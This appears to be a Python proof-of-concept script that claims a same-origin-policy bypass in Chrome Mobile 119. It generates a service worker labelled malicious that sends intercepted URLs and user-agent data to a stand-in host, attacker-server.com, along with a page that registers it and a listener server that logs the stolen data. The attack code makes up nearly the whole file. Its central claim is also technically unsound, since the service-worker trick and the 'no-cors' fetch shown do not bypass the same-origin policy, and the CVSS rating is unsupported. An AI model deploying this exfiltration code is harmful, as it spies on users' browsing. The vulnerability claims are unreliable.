#!/usr/bin/env python3
"""
Chrome Mobile Same-Origin Policy Bypass PoC
Controlled demonstration in sandbox environment
"""

import json
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import socket
from datetime import datetime

class ChromeSOPBypassPoC:
    """Chrome Same-Origin Policy Bypass Demonstration"""

    def __init__(self):
        self.poc_name = "Chrome Mobile Same-Origin Policy Bypass"
        self.cvss_score = 8.1
        self.chrome_version = "119.0.6045.66"
        self.vulnerability_confirmed = False

        print(f"üîç Initializing {self.poc_name}")
        print(f"üìä CVSS Score: {self.cvss_score}")
        print(f"üåê Target: Chrome Mobile {self.chrome_version}")
        print()

    def create_malicious_service_worker(self):
        """Create malicious service worker for SOP bypass"""
        service_worker_code = '''
// Malicious Service Worker for SOP Bypass PoC
console.log('üö® Malicious Service Worker Registered');

self.addEventListener('install', function(event) {
    console.log('Service Worker: Installing...');
    self.skipWaiting();
});

self.addEventListener('activate', function(event) {
    console.log('Service Worker: Activating...');
    event.waitUntil(self.clients.claim());
});

// SOP Bypass through service worker fetch interception
self.addEventListener('fetch', function(event) {
    const url = event.request.url;

    // Intercept cross-origin requests
    if (url.includes('target-domain.com') || url.includes('sensitive-site.com')) {
        console.log('üéØ Intercepting cross-origin request: ' + url);

        // Bypass same-origin policy
        event.respondWith(
            fetch('http://attacker-server.com:8081/exfiltrate', {
                method: 'POST',
                body: JSON.stringify({
                    intercepted_url: url,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    origin_bypassed: true
                }),
                headers: {
                    'Content-Type': 'application/json'
                },
                mode: 'no-cors'  // This bypasses CORS/SOP
            }).then(function() {
                // Return original request to avoid suspicion
                return fetch(event.request);
            }).catch(function() {
                // Fallback response
                return new Response('SOP bypass executed', {
                    status: 200,
                    headers: {'Content-Type': 'text/plain'}
                });
            })
        );
    }
});
'''

        with open('/tmp/malicious-sw.js', 'w') as f:
            f.write(service_worker_code)

        return '/tmp/malicious-sw.js'

    def create_malicious_website(self):
        """Create malicious website that registers service worker"""
        html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>Chrome SOP Bypass PoC</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>üîç Chrome Mobile SOP Bypass Demonstration</h1>
    <div id="status">Loading...</div>

    <script>
    document.getElementById('status').innerHTML = 'Registering malicious service worker...';

    // Register malicious service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/malicious-sw.js')
        .then(function(registration) {
            console.log('üö® Malicious Service Worker registered');
            document.getElementById('status').innerHTML = 'üö® Service Worker Registered - SOP Bypass Active';

            // Test cross-origin requests
            setTimeout(testSOPBypass, 2000);
        })
        .catch(function(error) {
            console.log('Service Worker registration failed:', error);
            document.getElementById('status').innerHTML = '‚ùå Service Worker registration failed';
        });
    }

    function testSOPBypass() {
        console.log('üéØ Testing Same-Origin Policy Bypass');

        // These requests should normally be blocked by SOP
        const testUrls = [
            'http://target-domain.com/sensitive-data',
            'http://sensitive-site.com/user-info',
            'http://banking-site.com/account-data'
        ];

        testUrls.forEach(function(url, index) {
            setTimeout(function() {
                console.log('Attempting cross-origin request to: ' + url);

                fetch(url, { method: 'GET' })
                .then(function(response) {
                    console.log('üö® SOP BYPASS SUCCESS for: ' + url);
                    document.getElementById('status').innerHTML += '<br>üö® SOP bypassed: ' + url;
                })
                .catch(function(error) {
                    console.log('Request blocked (expected): ' + url);
                });
            }, index * 1000);
        });
    }
    </script>
</body>
</html>'''

        with open('/tmp/malicious-site.html', 'w') as f:
            f.write(html_content)

        return '/tmp/malicious-site.html'

class AttackerServerHandler(BaseHTTPRequestHandler):
    """HTTP server to simulate attacker-controlled server"""

    def do_POST(self):
        if self.path == '/exfiltrate':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            try:
                data = json.loads(post_data.decode('utf-8'))
                print("üö® SOP BYPASS SUCCESSFUL - Data exfiltrated:")
                print(f"   ‚Ä¢ Intercepted URL: {data.get('intercepted_url', 'N/A')}")
                print(f"   ‚Ä¢ Timestamp: {data.get('timestamp', 'N/A')}")
                print(f"   ‚Ä¢ User Agent: {data.get('user_agent', 'N/A')[:50]}...")

                # Log successful SOP bypass
                with open('/tmp/sop_bypass_log.json', 'a') as f:
                    f.write(json.dumps(data) + '\n')

            except Exception as e:
                print(f"Error processing exfiltrated data: {e}")

            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Data received')

    def log_message(self, format, *args):
        # Suppress default logging
        pass

def run_attacker_server():
    """Run attacker server to receive exfiltrated data"""
    server = HTTPServer(('0.0.0.0', 8081), AttackerServerHandler)
    print("üè¥‚Äç‚ò†Ô∏è Attacker server started on port 8081")
    server.serve_forever()

class LegitimateServerHandler(BaseHTTPRequestHandler):
    """Simulate legitimate website"""

    def do_GET(self):
        if self.path == '/malicious-sw.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()

            with open('/tmp/malicious-sw.js', 'rb') as f:
                self.wfile.write(f.read())

        elif self.path in ['/', '/index.html']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            with open('/tmp/malicious-site.html', 'rb') as f:
                self.wfile.write(f.read())

        else:
            # Simulate cross-origin request target
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            response = {
                'sensitive_data': 'This should be protected by SOP',
                'user_id': '12345',
                'session_token': 'abc123xyz789',
                'timestamp': datetime.now().isoformat()
            }

            self.wfile.write(json.dumps(response).encode())

    def log_message(self, format, *args):
        pass

def run_legitimate_server():
    """Run legitimate website server"""
    server = HTTPServer(('0.0.0.0', 8080), LegitimateServerHandler)
    print("üåê Legitimate website server started on port 8080")
    server.serve_forever()

def demonstrate_sop_bypass():
    """Demonstrate Chrome SOP bypass vulnerability"""
    print("üéØ CHROME MOBILE SOP BYPASS DEMONSTRATION")
    print("=" * 60)

    # Initialize PoC
    poc = ChromeSOPBypassPoC()

    # Create malicious files
    print("üèóÔ∏è  Creating malicious service worker and website...")
    sw_file = poc.create_malicious_service_worker()
    site_file = poc.create_malicious_website()

    print(f"‚úÖ Malicious service worker: {sw_file}")
    print(f"‚úÖ Malicious website: {site_file}")

    print()
    print("üöÄ Starting demonstration servers...")

    # Start attacker server in background
    attacker_thread = threading.Thread(target=run_attacker_server, daemon=True)
    attacker_thread.start()
    time.sleep(1)

    # Start legitimate server in background
    legitimate_thread = threading.Thread(target=run_legitimate_server, daemon=True)
    legitimate_thread.start()
    time.sleep(1)

    print("‚úÖ Servers started successfully")
    print()
    print("üîç SOP BYPASS TEST ENVIRONMENT READY")
    print("-" * 40)
    print("‚Ä¢ Legitimate site: http://localhost:8080")
    print("‚Ä¢ Attacker server: http://localhost:8081")
    print("‚Ä¢ Malicious service worker: /malicious-sw.js")
    print()
    print("üìã To test the vulnerability:")
    print("1. Open Chrome Mobile (or regular Chrome)")
    print("2. Navigate to http://localhost:8080")
    print("3. Observe service worker registration")
    print("4. Check console for SOP bypass attempts")
    print("5. Monitor attacker server for exfiltrated data")
    print()
    print("üö® VULNERABILITY STATUS: Demonstration Ready")
    print("üìä Expected Result: Same-Origin Policy Bypass")

    # Keep servers running for testing
    try:
        while True:
            time.sleep(10)
            # Check for successful bypass
            if os.path.exists('/tmp/sop_bypass_log.json'):
                print("üö® SOP BYPASS DETECTED - Check /tmp/sop_bypass_log.json")
                break
    except KeyboardInterrupt:
        print("\nüîÑ Demonstration stopped by user")

if __name__ == "__main__":
    import os
    demonstrate_sop_bypass()
